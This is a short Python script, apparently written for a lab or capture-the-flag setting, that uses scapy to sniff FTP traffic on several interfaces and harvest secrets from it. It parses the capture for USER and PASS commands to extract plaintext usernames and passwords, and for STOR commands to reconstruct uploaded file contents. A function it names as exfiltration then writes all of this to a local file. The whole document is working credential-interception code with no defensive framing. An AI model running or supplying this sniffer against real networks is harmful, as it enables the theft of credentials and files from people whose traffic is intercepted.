#!/usr/bin/python3
from scapy.all import *
import time

def intercept_packets(interface, filter_expression, timeout):
    start_time = time.time()
    packets = []
    
    print(f"Intercepting packets on interface {interface} for {timeout} seconds...")
    while time.time() - start_time < timeout:
        timeout_func = timeout - (time.time() - start_time)
        captured_packets = sniff(iface=interface, filter=filter_expression, timeout=timeout_func)
        if captured_packets:
            packets += captured_packets
        else:
            break
    
    return packets

def parse_pcap(capture_file):
    packets = rdpcap(capture_file)
    raw_data_list = []

    for packet in packets:
        print(packet.summary())
        
        if Raw in packet:
            raw_data = packet[Raw].load.decode('utf-8')
            
            if raw_data.startswith('USER'):
                username = raw_data.split(' ')[1].strip()
                raw_data_list.append(f'Username: {username}')
                raw_data_list.append('\n')

            elif raw_data.startswith('PASS'):
                password = raw_data.split(' ')[1].strip()
                raw_data_list.append(f'Password: {password}')
                raw_data_list.append('\n')

            elif raw_data.startswith('STOR'):
                filename = raw_data.split(' ')[1].strip()
                raw_data_list.append(f'File: {filename}')
                raw_data_list.append('---Start of File Content---')

                for next_packet in packets[packets.index(packet) + 1:]:
                    if Raw in next_packet:
                        next_raw_data = next_packet[Raw].load.decode('utf-8')
                        if next_raw_data.startswith('STOR'):
                            break
                        elif not next_raw_data.startswith(('150', '226', '200', 'TYPE', 'PASV', '227', '221', 'QUIT')):
                            raw_data_list.append(next_raw_data)
                raw_data_list.append('---End of File Content---')
                raw_data_list.append('\n')

            #print(f"Raw Data: {raw_data}")

    return raw_data_list

def exifiltr_data(raw_data_list):
    with open("ftp_rawdata.txt", "w") as w:
        for data in raw_data_list:
            cleaned_data = data.strip("b'\n")
            w.write(cleaned_data + '\n')

def read_data():
    with open("ftp_rawdata.txt", "r") as r:
        read_data_lines = r.readlines()
    print(read_data_lines)
    return read_data_lines

if __name__ == "__main__":
    interface = ["eth0", "lo", "br-c5a509f486c7"] 
    filter_expression = "port 21 or (portrange 21100-21110)"
    timeout = 25  # Seconds
    
    captured_packets = intercept_packets(interface, filter_expression, timeout)
    if captured_packets:
        wrpcap("ftp_capturestocker.pcap", captured_packets)
        packets = parse_pcap("ftp_capturestocker.pcap")
        exifiltr_data(packets)  
        read_data()
    else:
        print("No packets captured within the specified timeout.")
    print("\r"+"#" * 50 + "\n")

